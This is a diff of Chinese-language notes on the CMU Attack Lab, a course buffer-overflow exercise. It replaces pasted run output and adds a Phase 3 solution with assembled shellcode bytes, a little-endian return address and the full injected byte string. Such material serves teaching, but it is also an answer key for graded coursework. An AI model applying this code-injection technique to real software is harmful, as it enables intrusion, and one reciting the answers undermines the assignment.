@@ -19,14 +19,7 @@
 NB. 小段序，所以返回地址要倒着写 ie. `c0 17 40 00 00 00 00 00`
 
 ```bash
-➜  attack git:(main) ✗ ./hex2raw < ans/1.txt | ./ctarget -q
-Cookie: 0x59b997fa
-Type string:Touch1!: You called touch1()
-Valid solution for level 1 with target ctarget
-PASS: Would have posted the following:
-        user id bovik
-        course  15213-f15
-        lab     attacklab
+./hex2raw < ans/1.txt | ./ctarget -q
 ```
 
 
@@ -62,15 +55,31 @@ PASS: Would have posted the following:
 
 gdb可以发现，在getbuf返回之前`$rsp   : 0x000000005561dca0`
 
-自己程序的开头就是`0x000000005561dca8`
+自己程序的开头就是 rsp+8 = `0x000000005561dca8`
 
-```bash
-➜  attack git:(main) ✗ ./hex2raw < ans/2.txt | ./ctarget -q
-Cookie: 0x59b997fa
-Type string:Touch2!: You called touch2(0x59b997fa)
-Valid solution for level 2 with target ctarget
-PASS: Would have posted the following:
-        user id bovik
-        course  15213-f15
-        lab     attacklab
+
+
+## Phase 3
+
+```asm
+00000000004018fa <touch3>: ...
 ```
+
+```asm
+0000000000000000 <.text>:
+   0:   68 fa 18 40 00          push   $0x4018fa
+   5:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
+   c:   c3                      ret
+```
+
+string形式的cookie `35 39 62 39 39 37 66 61 00` 长度是9
+
+所以string的位置就是rsp+8，因为跳过了返回地址
+
+代码起始位置 rsp+8+9，还跳过了string
+
+ie. `0x5561DCB1` = little endian `b1 dc 61 55 00 00 00 00`
+
+需要输入的字符 (40 bytes random) (ret addr) (string cookie) (code) 
+
+... (b1 dc 61 55 00 00 00 00) (35 39 62 39 39 37 66 61 00) (68 fa 18 40 00 48 c7 c7 a8 dc 61 55 c3)
